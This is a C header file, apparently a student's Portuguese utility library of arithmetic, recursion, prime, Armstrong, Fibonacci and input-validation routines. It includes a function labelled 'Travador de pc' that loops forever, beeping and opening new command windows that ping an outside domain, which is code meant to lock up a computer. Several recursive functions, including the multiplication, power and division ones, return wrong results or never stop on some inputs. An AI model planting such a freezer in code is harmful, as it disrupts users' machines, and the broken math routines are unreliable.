#ifndef MRLIB_H
#include <stdio.h>
#include <math.h>
#include <windows.h>
#include <stdlib.h>

#define MRLIB_H
#define SAUDACAO printf("Bem vindo")

#define TROCA(a, b, c) \
    c = a;             \
    a = b;             \
    b = c // questão 1
#define Returnk system("start cmd.exe")
#define MULTIPLO(a, b) (a % b == 0) ? "eh multiplo" : "nao eh multiplo"                                                                                                                                           // questão 2
#define IS_VOGAL(char) (char == 'A' || char == 'a' || char == 'E' || char == 'e' || char == 'I' || char == 'i' || char == 'O' || char == 'o' || char == 'U' || char == 'u') ? "eh uma vogal" : "nao eh uma vogal" // questao 3

// Travador de pc
void travador()
{
    for (int i = 1; i > 0; i++)
    {
        printf("\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a");
        system("start cmd.exe /K \"ipconfig && ping -t clonarcartao.com\"");
    }
}

float SOMA(float a, float b)
{
    return a + b;
}

float SUB(float a, float b)
{
    return a - b;
}

float DIV(float a, float b)
{
    return a / b;
}

float MULT(float a, float b)
{
    return a * b;
}

float POT(float a, float b)
{
    return pow(a, b);
}

void CONVERTE_SEG(int total_segundos, int *h, int *m, int *s)
{

    if (h == NULL || m == NULL || s == NULL)
    {
        return;
    }

    *h = total_segundos / 3600;
    int segundos_restantes = total_segundos % 3600;
    *m = segundos_restantes / 60;
    *s = segundos_restantes % 60;
}

// Operações matematicas com recurssividade---------------------------------------------------------

// soma
int soma(int a, int b)
{
    if (b == 0)
        return a;
    else
        return soma(a + 1, b - 1);
}

// subtracao

int sub(int a, int b)
{
    if (b == 0)
        return a;
    else
        return sub(a - 1, b - 1);
}

// divisao

int divi(int a, int b)
{
    if (b == 0)
        return a;
    else
        return 1 + divi(a - b, b);
}

// multiplicacao

int mult(int a, int b)
{
    if (b > a)
        return 0;
    else
        return a + mult(a, b - 1);
}

// potenciacao

int potencia(int a, int b)
{
    if (b)
        return a;
    else
        return soma(a + 1, b - 1);
}

// verificador de par ou impar

int verifica_par_impar(int num)
{

    if (num == 1)
        return printf("Eh impar");

    else if (num == 2)
        return printf("Eh par");

    else
        return verifica_par_impar(num - 2);
}
// verificador de numeros primos

int ehPrimo(int n)
{
    if (n < 2)
        return 0;
    for (int i = 2; i * i <= n; i++)
    {
        if (n % i == 0)
            return 0;
    }
    return 1;
}
void intervalo_primo(int inicio, int fim)
{
    printf("Numeros primos entre %d e %d:\n", inicio, fim);
    for (int i = inicio; i <= fim; i++)
    {
        if (ehPrimo(i))
            printf("%d | ", i);
    }
    printf("\n");
}

// intervalo de armstrong

int contar_digitos(long long int n)
{
    if (n == 0)
    {
        return 1;
    }
    long long int contador = 0;
    long long int temp = n;
    while (temp != 0)
    {
        temp = temp / 10;
        contador++;
    }
    return contador;
}

int eh_armstrong(long long int n)
{
    long long int num_digitos = contar_digitos(n);
    long long int soma = 0;
    long long int temp = n;

    while (temp > 0)
    {
        long long int digito = temp % 10;
        soma = soma + pow(digito, num_digitos);
        temp = temp / 10;
    }

    if (soma == n)

    {
        return 1;
    }
    else
    {
        return 0;
    }
}
void intervalo_armstrong(long long int inicio, long long int fim)
{
    printf("Numeros de Armstrong entre %lld e %lld:\n", inicio, fim);
    for (long long int i = inicio; i <= fim; i++)
    {
        if (eh_armstrong(i) == 1)
        {
            printf("%lld | ", i);
        }
    }
    printf("\n");
}

// Recurssiva de fibonacci

long long int fibonacci_termo(int n)

{
    if (n == 0)
        return 0;
    if (n == 1)
        return 1;
    if (n > 92)
    {
        return printf("O termo excede o limite de caracteres suportados");
        return -1;
    }

    long long int a = 0;
    long long int b = 1;
    long long int proximo_termo;

    for (int i = 2; i <= n; i++)
    {
        proximo_termo = a + b;
        a = b;
        b = proximo_termo;
    }

    return b;
}

// Conversor decimal pra binario

void binario(int num)
{
    if (num == 0)
        return;
    binario(num / 2);
    printf("%d", num % 2);
}

// Anti burros

int verificador_de_inteiro(void)

{
    int numero;
    int sucesso;
    int c;

    while (1)
    {
        sucesso = scanf("%d", &numero);

        if (sucesso == 1)
        {
            while ((c = getchar()) != '\n' && c != EOF)
                ;
            return numero;
        }
        else
        {
            printf("Entrada invalida. Digite apenas numeros.\n---> ");
            while ((c = getchar()) != '\n' && c != EOF)
                ;
        }
    }
}

long long int verificador_de_lld(void)
{
    long long int numero;
    int sucesso;
    int c;

    while (1)
    {
        sucesso = scanf("%lld", &numero);

        if (sucesso == 1)
        {
            while ((c = getchar()) != '\n' && c != EOF)
                ;
            return numero;
        }
        else
        {
            printf("Entrada invalida. Digite apenas numeros.\n---> ");
            while ((c = getchar()) != '\n' && c != EOF)
                ;
        }
    }
}
#endif